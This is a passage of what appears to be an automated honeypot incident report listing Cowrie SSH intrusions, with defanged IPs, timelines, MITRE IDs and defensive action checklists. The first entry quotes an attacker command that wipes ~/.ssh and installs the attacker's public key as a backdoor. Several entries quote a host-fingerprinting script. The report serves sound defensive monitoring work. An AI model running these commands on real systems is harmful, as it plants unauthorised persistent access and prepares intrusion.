| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:23:27` | `cowrie.session.connect` |
| `2026-08-11 08:23:27` | `cowrie.client.version` |
| `2026-08-11 08:23:27` | `cowrie.client.kex` |
| `2026-08-11 08:23:27` | `cowrie.login.success` |
| `2026-08-11 08:23:28` | `cowrie.session.params` |
| `2026-08-11 08:23:28` | `cowrie.command.input` |
| `2026-08-11 08:23:28` | `cowrie.command.failed` |
| `2026-08-11 08:23:28` | `cowrie.log.closed` |
| `2026-08-11 08:23:29` | `cowrie.session.params` |
| `2026-08-11 08:23:29` | `cowrie.command.input` |
| `2026-08-11 08:23:29` | `cowrie.session.file_download` |
| `2026-08-11 08:23:29` | `cowrie.log.closed` |
| `2026-08-11 08:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `12.156.67[.]18` to AbuseIPDB if not already reported
- [ ] Block `12.156.67[.]18` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0a021ba2f06

| Field | Detail |
|---|---|
| **Source IP** | `12.156.67[.]18` |
| **First Seen** | 2026-08-11 08:23 |
| **Last Seen** | 2026-08-11 08:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:23:29` | `cowrie.session.connect` |
| `2026-08-11 08:23:29` | `cowrie.client.version` |
| `2026-08-11 08:23:29` | `cowrie.client.kex` |
| `2026-08-11 08:23:29` | `cowrie.login.success` |
| `2026-08-11 08:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `12.156.67[.]18` to AbuseIPDB if not already reported
- [ ] Block `12.156.67[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a2636b54562

| Field | Detail |
|---|---|
| **Source IP** | `12.156.67[.]18` |
| **First Seen** | 2026-08-11 08:23 |
| **Last Seen** | 2026-08-11 08:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:23:30` | `cowrie.session.connect` |
| `2026-08-11 08:23:30` | `cowrie.client.version` |
| `2026-08-11 08:23:30` | `cowrie.client.kex` |
| `2026-08-11 08:23:30` | `cowrie.login.success` |
| `2026-08-11 08:23:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `12.156.67[.]18` to AbuseIPDB if not already reported
- [ ] Block `12.156.67[.]18` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c72659cd59a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:24 |
| **Last Seen** | 2026-08-11 08:24 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:24:13` | `cowrie.session.connect` |
| `2026-08-11 08:24:13` | `cowrie.client.version` |
| `2026-08-11 08:24:13` | `cowrie.client.kex` |
| `2026-08-11 08:24:15` | `cowrie.login.success` |
| `2026-08-11 08:24:16` | `cowrie.session.params` |
| `2026-08-11 08:24:16` | `cowrie.command.input` |
| `2026-08-11 08:24:16` | `cowrie.command.input` |
| `2026-08-11 08:24:16` | `cowrie.command.input` |
| `2026-08-11 08:24:16` | `cowrie.command.input` |
| `2026-08-11 08:24:16` | `cowrie.command.input` |
| `2026-08-11 08:24:16` | `cowrie.command.success` |
| `2026-08-11 08:24:16` | `cowrie.command.input` |
| `2026-08-11 08:24:16` | `cowrie.command.input` |
| `2026-08-11 08:24:16` | `cowrie.command.input` |
| `2026-08-11 08:24:16` | `cowrie.command.input` |
| `2026-08-11 08:24:17` | `cowrie.log.closed` |
| `2026-08-11 08:24:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b02f9c34dbcc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:26 |
| **Last Seen** | 2026-08-11 08:26 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:26:08` | `cowrie.session.connect` |
| `2026-08-11 08:26:08` | `cowrie.client.version` |
| `2026-08-11 08:26:08` | `cowrie.client.kex` |
| `2026-08-11 08:26:11` | `cowrie.login.success` |
| `2026-08-11 08:26:12` | `cowrie.session.params` |
| `2026-08-11 08:26:12` | `cowrie.command.input` |
| `2026-08-11 08:26:12` | `cowrie.command.input` |
| `2026-08-11 08:26:12` | `cowrie.command.input` |
| `2026-08-11 08:26:12` | `cowrie.command.input` |
| `2026-08-11 08:26:12` | `cowrie.command.input` |
| `2026-08-11 08:26:12` | `cowrie.command.success` |
| `2026-08-11 08:26:12` | `cowrie.command.input` |
| `2026-08-11 08:26:12` | `cowrie.command.input` |
| `2026-08-11 08:26:12` | `cowrie.command.input` |
| `2026-08-11 08:26:12` | `cowrie.command.input` |
| `2026-08-11 08:26:13` | `cowrie.log.closed` |
| `2026-08-11 08:26:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d17883952dc

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:28 |
| **Last Seen** | 2026-08-11 08:28 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:28:50` | `cowrie.session.connect` |
| `2026-08-11 08:28:51` | `cowrie.client.version` |
| `2026-08-11 08:28:51` | `cowrie.client.kex` |
| `2026-08-11 08:28:53` | `cowrie.login.success` |
| `2026-08-11 08:28:55` | `cowrie.session.params` |
| `2026-08-11 08:28:55` | `cowrie.command.input` |
| `2026-08-11 08:28:55` | `cowrie.command.input` |
| `2026-08-11 08:28:55` | `cowrie.command.input` |
| `2026-08-11 08:28:55` | `cowrie.command.input` |
| `2026-08-11 08:28:55` | `cowrie.command.input` |
| `2026-08-11 08:28:55` | `cowrie.command.success` |
| `2026-08-11 08:28:55` | `cowrie.command.input` |
| `2026-08-11 08:28:55` | `cowrie.command.input` |
| `2026-08-11 08:28:55` | `cowrie.command.input` |
| `2026-08-11 08:28:55` | `cowrie.command.input` |
| `2026-08-11 08:28:56` | `cowrie.log.closed` |
| `2026-08-11 08:28:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7a987835c05

| Field | Detail |
|---|---|
| **Source IP** | `172.104.11[.]34` |
| **First Seen** | 2026-08-11 08:29 |
| **Last Seen** | 2026-08-11 08:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0[.]0 Safari/537.36, Accept: */*, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:29:48` | `cowrie.session.connect` |
| `2026-08-11 08:29:48` | `cowrie.login.success` |
| `2026-08-11 08:29:48` | `cowrie.session.params` |
| `2026-08-11 08:29:48` | `cowrie.command.input` |
| `2026-08-11 08:29:48` | `cowrie.command.input` |
| `2026-08-11 08:29:48` | `cowrie.command.failed` |
| `2026-08-11 08:29:48` | `cowrie.command.input` |
| `2026-08-11 08:29:48` | `cowrie.command.failed` |
| `2026-08-11 08:29:48` | `cowrie.command.input` |
| `2026-08-11 08:29:48` | `cowrie.log.closed` |
| `2026-08-11 08:29:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.104.11[.]34` to AbuseIPDB if not already reported
- [ ] Block `172.104.11[.]34` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-598a30599014

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:30 |
| **Last Seen** | 2026-08-11 08:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:30:41` | `cowrie.session.connect` |
| `2026-08-11 08:30:42` | `cowrie.client.version` |
| `2026-08-11 08:30:42` | `cowrie.client.kex` |
| `2026-08-11 08:30:44` | `cowrie.login.success` |
| `2026-08-11 08:30:45` | `cowrie.session.params` |
| `2026-08-11 08:30:45` | `cowrie.command.input` |
| `2026-08-11 08:30:45` | `cowrie.command.input` |
| `2026-08-11 08:30:45` | `cowrie.command.input` |
| `2026-08-11 08:30:45` | `cowrie.command.input` |
| `2026-08-11 08:30:45` | `cowrie.command.input` |
| `2026-08-11 08:30:45` | `cowrie.command.success` |
| `2026-08-11 08:30:45` | `cowrie.command.input` |
| `2026-08-11 08:30:45` | `cowrie.command.input` |
| `2026-08-11 08:30:45` | `cowrie.command.input` |
| `2026-08-11 08:30:45` | `cowrie.command.input` |
| `2026-08-11 08:30:46` | `cowrie.log.closed` |
| `2026-08-11 08:30:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7652cd464974

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:32 |
| **Last Seen** | 2026-08-11 08:33 |
| **Session Duration** | 19s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:32:47` | `cowrie.session.connect` |
| `2026-08-11 08:32:49` | `cowrie.client.version` |
| `2026-08-11 08:32:49` | `cowrie.client.kex` |
| `2026-08-11 08:32:58` | `cowrie.login.success` |
| `2026-08-11 08:33:03` | `cowrie.session.params` |
| `2026-08-11 08:33:03` | `cowrie.command.input` |
| `2026-08-11 08:33:03` | `cowrie.command.input` |
| `2026-08-11 08:33:03` | `cowrie.command.input` |
| `2026-08-11 08:33:03` | `cowrie.command.input` |
| `2026-08-11 08:33:03` | `cowrie.command.input` |
| `2026-08-11 08:33:03` | `cowrie.command.success` |
| `2026-08-11 08:33:03` | `cowrie.command.input` |
| `2026-08-11 08:33:03` | `cowrie.command.input` |
| `2026-08-11 08:33:03` | `cowrie.command.input` |
| `2026-08-11 08:33:03` | `cowrie.command.input` |
| `2026-08-11 08:33:05` | `cowrie.log.closed` |
| `2026-08-11 08:33:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1115ec0abd72

| Field | Detail |
|---|---|
| **Source IP** | `35.130.111[.]98` |
| **First Seen** | 2026-08-11 08:33 |
| **Last Seen** | 2026-08-11 08:38 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:33:33` | `cowrie.session.connect` |
| `2026-08-11 08:33:34` | `cowrie.client.version` |
| `2026-08-11 08:33:34` | `cowrie.client.kex` |
| `2026-08-11 08:33:35` | `cowrie.login.success` |
| `2026-08-11 08:33:35` | `cowrie.direct-tcpip.request` |
| `2026-08-11 08:38:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.130.111[.]98` to AbuseIPDB if not already reported
- [ ] Block `35.130.111[.]98` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db696f4f4dbb

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:35 |
| **Last Seen** | 2026-08-11 08:35 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:35:15` | `cowrie.session.connect` |
| `2026-08-11 08:35:15` | `cowrie.client.version` |
| `2026-08-11 08:35:15` | `cowrie.client.kex` |
| `2026-08-11 08:35:17` | `cowrie.login.success` |
| `2026-08-11 08:35:18` | `cowrie.session.params` |
| `2026-08-11 08:35:18` | `cowrie.command.input` |
| `2026-08-11 08:35:18` | `cowrie.command.input` |
| `2026-08-11 08:35:18` | `cowrie.command.input` |
| `2026-08-11 08:35:18` | `cowrie.command.input` |
| `2026-08-11 08:35:18` | `cowrie.command.input` |
| `2026-08-11 08:35:18` | `cowrie.command.success` |
| `2026-08-11 08:35:18` | `cowrie.command.input` |
| `2026-08-11 08:35:18` | `cowrie.command.input` |
| `2026-08-11 08:35:18` | `cowrie.command.input` |
| `2026-08-11 08:35:18` | `cowrie.command.input` |
| `2026-08-11 08:35:18` | `cowrie.log.closed` |
| `2026-08-11 08:35:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0994f8cf3f71

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:37 |
| **Last Seen** | 2026-08-11 08:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:37:17` | `cowrie.session.connect` |
| `2026-08-11 08:37:17` | `cowrie.client.version` |
| `2026-08-11 08:37:17` | `cowrie.client.kex` |
| `2026-08-11 08:37:19` | `cowrie.login.success` |
| `2026-08-11 08:37:20` | `cowrie.session.params` |
| `2026-08-11 08:37:20` | `cowrie.command.input` |
| `2026-08-11 08:37:20` | `cowrie.command.input` |
| `2026-08-11 08:37:20` | `cowrie.command.input` |
| `2026-08-11 08:37:20` | `cowrie.command.input` |
| `2026-08-11 08:37:20` | `cowrie.command.input` |
| `2026-08-11 08:37:20` | `cowrie.command.success` |
| `2026-08-11 08:37:20` | `cowrie.command.input` |
| `2026-08-11 08:37:20` | `cowrie.command.input` |
| `2026-08-11 08:37:20` | `cowrie.command.input` |
| `2026-08-11 08:37:20` | `cowrie.command.input` |
| `2026-08-11 08:37:21` | `cowrie.log.closed` |
| `2026-08-11 08:37:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-30cc0daba0e7

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-08-11 08:37 |
| **Last Seen** | 2026-08-11 08:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:37:43` | `cowrie.session.connect` |
| `2026-08-11 08:37:44` | `cowrie.client.version` |
| `2026-08-11 08:37:44` | `cowrie.client.kex` |
| `2026-08-11 08:37:46` | `cowrie.login.success` |
| `2026-08-11 08:37:46` | `cowrie.direct-tcpip.request` |
| `2026-08-11 08:37:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48905fc9c66b

| Field | Detail |
|---|---|
| **Source IP** | `101.13.4[.]124` |
| **First Seen** | 2026-08-11 08:37 |
| **Last Seen** | 2026-08-11 08:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:37:56` | `cowrie.session.connect` |
| `2026-08-11 08:37:57` | `cowrie.client.version` |
| `2026-08-11 08:37:57` | `cowrie.client.kex` |
| `2026-08-11 08:37:59` | `cowrie.login.success` |
| `2026-08-11 08:37:59` | `cowrie.direct-tcpip.request` |
| `2026-08-11 08:38:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.13.4[.]124` to AbuseIPDB if not already reported
- [ ] Block `101.13.4[.]124` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-908e48275025

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:39 |
| **Last Seen** | 2026-08-11 08:39 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-11 08:39:54` | `cowrie.session.connect` |
| `2026-08-11 08:39:54` | `cowrie.client.version` |
| `2026-08-11 08:39:54` | `cowrie.client.kex` |
| `2026-08-11 08:39:56` | `cowrie.login.success` |
| `2026-08-11 08:39:57` | `cowrie.session.params` |
| `2026-08-11 08:39:57` | `cowrie.command.input` |
| `2026-08-11 08:39:57` | `cowrie.command.input` |
| `2026-08-11 08:39:57` | `cowrie.command.input` |
| `2026-08-11 08:39:57` | `cowrie.command.input` |
| `2026-08-11 08:39:57` | `cowrie.command.input` |
| `2026-08-11 08:39:57` | `cowrie.command.success` |
| `2026-08-11 08:39:57` | `cowrie.command.input` |
| `2026-08-11 08:39:57` | `cowrie.command.input` |
| `2026-08-11 08:39:57` | `cowrie.command.input` |
| `2026-08-11 08:39:57` | `cowrie.command.input` |
| `2026-08-11 08:39:58` | `cowrie.log.closed` |
| `2026-08-11 08:39:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3dfe8f63bdea

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-08-11 08:41 |
| **Last Seen** | 2026-08-11 08:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
